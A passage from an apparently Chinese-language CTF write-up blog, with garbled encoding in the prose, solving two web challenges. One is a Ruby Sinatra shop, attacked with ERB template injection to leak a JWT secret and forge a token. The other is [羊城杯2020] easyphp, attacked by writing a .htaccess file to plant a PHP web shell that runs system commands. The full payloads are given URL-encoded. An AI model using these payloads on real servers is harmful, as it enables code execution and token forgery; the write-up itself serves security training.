class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br><br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br><br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br><br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br><br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br><br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br><br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>é€ç»™chatè¯´è¿™æ˜¯rubyè¯­è¨€</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>ä¸»è¦ä»£ç æ˜¯è¿™æ®µ<br>è¿™é‡Œæœ‰ç”¨åˆ°erbæ¨¡æ¿æ³¨å…¥</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œè¦æ˜¯ SECRET å‚æ•°å­˜åœ¨åˆ™å¯¹å…¶è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…åˆ°äº†å°±è¾“å‡ºflag<br>ä½†è¿™é‡Œæ—¢ç„¶æœ‰åŒ¹é…ï¼Œå°±å¯ä»¥ç”¨å…¨å±€å˜é‡è¯»å‡ºæ¥äº†ï¼Œä¹Ÿå°±æ˜¯ç”¨ $&#96; æ¥è¯»å–åŒ¹é…å‰çš„å†…å®¹</p>
<p>å¦‚æœä¼ å…¥çš„å‚æ•°doå’Œnameä¸€è‡´ï¼Œåˆ™ä¼šè¾“å‡º<code>&#123;params[:name][0,7]&#125; </code>working successfully!<br>ä½¿ç”¨Rubyçš„é¢„å®šä¹‰å˜é‡$â€™(æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…å³è¾¹çš„å­—ç¬¦ä¸²)<br>æ­£å¸¸ä¼ çš„è¯<br><img src="/images/A942F6C4E6014f97A130890CFC6B2639.png" srcset="/img/loading.gif" lazyload></p>
<p>åªè¦æ»¡è¶³äº†è¿™ä¸ªif <code>if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</code>ï¼Œå°±ä¼šè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ã€‚<br>å…·ä½“å‚è€ƒè¿™ä¸ªæ–‡ç« <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">ã€æŠ€æœ¯åˆ†äº«ã€‘æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®ŒæˆRuby ERBæ¨¡æ¿æ³¨å…¥</a><br>ä½†æ˜¯è¿™é¢˜æœ‰é•¿åº¦çš„é™åˆ¶ï¼Œé™¤å»&lt;%&#x3D;%&gt;ï¼Œå°±åªå‰©ä¸‹2ä¸ªå­—ç¬¦å¯ç”¨äº†ã€‚å¯ä»¥ç”¨rubyçš„é¢„å®šä¹‰å˜é‡<br><a target="_blank" rel="noopener" href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">é¢„å®šä¹‰å˜é‡</a><br>ä½¿ç”¨Rubyçš„é¢„å®šä¹‰å˜é‡$â€™(æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…å³è¾¹çš„å­—ç¬¦ä¸²)</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%=$&#x27;%&gt;<br></code></pre></td></tr></table></figure>
<p>æ„é€ ä¸€ä¸‹payload</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;<span class="hljs-keyword">do</span>=&lt;%=$&#x27;%&gt; is working<br></code></pre></td></tr></table></figure>
<p>ç›´æ¥ç”¨ä¼šæŠ¥é”™<br>urlç¼–ç ä¸€ä¸‹</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/work?SECRET<span class="hljs-operator">=</span>&amp;name<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e&amp;do<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>working<br></code></pre></td></tr></table></figure>

<p><img src="/images/F270D8590A114303A04FCBE3C5E8C616.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™æ ·secretå¯†é’¥å°±å‡ºæ¥äº†ï¼Œå¯¹JWTè¿›è¡Œä¿®æ”¹åŠ å¯†<br><img src="/images/49B8B6BAAA2547bcB351BD304945D36A.png" srcset="/img/loading.gif" lazyload><br>å¯¹cookieå†…å®¹æ›¿æ¢<br>å€¼æˆåŠŸæ”¹å˜<br><img src="/images/83F485747A584b6d88E217284FE4B8D5.png" srcset="/img/loading.gif" lazyload><br>buy flag<br><img src="/images/2944AD4BF4974e64813DEC107D945E76.png" srcset="/img/loading.gif" lazyload><br>æ²¡æœ‰ç›´æ¥å›æ˜¾flag<br>å†ä¹°ä¸‹flag<br>å¯ä»¥çœ‹åˆ°cookiesçš„å€¼æ˜æ˜¾å¤šäº†<br><img src="/images/45EEAAFF94D64b87B05F17CBDF9858F8.png" srcset="/img/loading.gif" lazyload><br>JWTè§£å¯†ä¸€ä¸‹<br><img src="/images/6579FF1931A549128C5507C83B77B03B.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="ç¾ŠåŸæ¯2020-easyphp"><a href="#ç¾ŠåŸæ¯2020-easyphp" class="headerlink" title="[ç¾ŠåŸæ¯2020]easyphp"></a>[ç¾ŠåŸæ¯2020]easyphp</h2><p>å…ˆçœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>é™¤index.phpçš„æ–‡ä»¶ä¼šè¢«åˆ é™¤</p>
<p>è¿˜æœ‰è¿™ä¸€æ®µå€¼å¾—æ³¨æ„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯å–åå¹¶ä¸æ˜¯åŒ¹é…ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸æ˜¯æ¢è¡Œç»•è¿‡ï¼Œè¿™é‡Œè¡¨ç¤ºå¦‚æœåŒ¹é…é™¤a-zå’Œ.å¤–çš„æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¿”å›1</p>
<p>æœ¬é¢˜åˆ©ç”¨çš„æ˜¯file_put_contentsè¿™ä¸€å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ–‡ä»¶ä¸Šä¼ ä¸€ä¸ª.htaccessæ¥ç»•è¿‡è¿‡æ»¤å¹¶æ‰§è¡Œå‘½ä»¤<br>.htaccess<br>æŠŠ.htaccessåŠ è½½åˆ°phpæ–‡ä»¶çš„å‰é¢ï¼Œè¿™è¾¹çš„è¯ä»¥æ³¨é‡Šçš„æ–¹æ³•æ¥å†™shell</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();</span><br></code></pre></td></tr></table></figure>

<p>è™½ç„¶è¿‡æ»¤äº†fileï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨\æ¥ç»•è¿‡ï¼Œ#åº”è¯¥æ˜¯.hatccessæ–‡ä»¶ç‰¹æœ‰çš„å†™å…¥å½¢å¼ï¼Œæ²¡æœ‰çš„è¯ä¼šç›´æ¥æŠ¥é”™500</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fil\ </span><br><span class="language-xml">e .htaccess </span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /fla&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\ </span><br></code></pre></td></tr></table></figure>
<p>æœ«å°¾åŠ ä¸ª\æ˜¯ä¸ºäº†è½¬ä¹‰\nï¼Œå¦‚æœä¸åŠ å°±ä¼šå˜ä¸ºä¸‹é¢è¿™ç§ï¼Œä¸ç¬¦åˆ.htaccessçš„è§„åˆ™</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fil\ </span><br><span class="language-xml">e .htaccess </span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /fla&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">Hello, world</span><br></code></pre></td></tr></table></figure>
<p>å†æœ«å°¾ä»·æ ¼åæ–œæ ä¼šæŠŠ\nå‰é¢çš„\ç»™è½¬ä¹‰æ‰ï¼Œè¿™æ ·å°±å˜ä¸ºäº†å¦‚ä¸‹è¿™æ ·ï¼š</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fil\ </span><br><span class="language-xml">e .htaccess </span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /fla&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">nHello, world</span><br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?filename=.htaccess&amp;content=php_value auto_prepend_fil\</span><br><span class="language-xml">e .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\</span><br></code></pre></td></tr></table></figure>
<p>ç¼–ç ä¸€ä¸‹ï¼Œå¦‚æœä¸ç¼–ç çš„è¯å°±ä¸åœ¨åŒä¸€è¡Œï¼Œä¼ çš„æ—¶å€™ä¸å¥½ä¼ ï¼Œæœ€åçš„åæ–œæ åé¢ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œæœ‰ç©ºæ ¼å°±è½¬ä¸äº†\</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>auto_prepend_fil<span class="hljs-variable">%5</span>C<span class="hljs-variable">%0</span>Ae<span class="hljs-variable">%20</span>.htaccess<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system(&#x27;ls<span class="hljs-variable">%20</span>/&#x27;)<span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
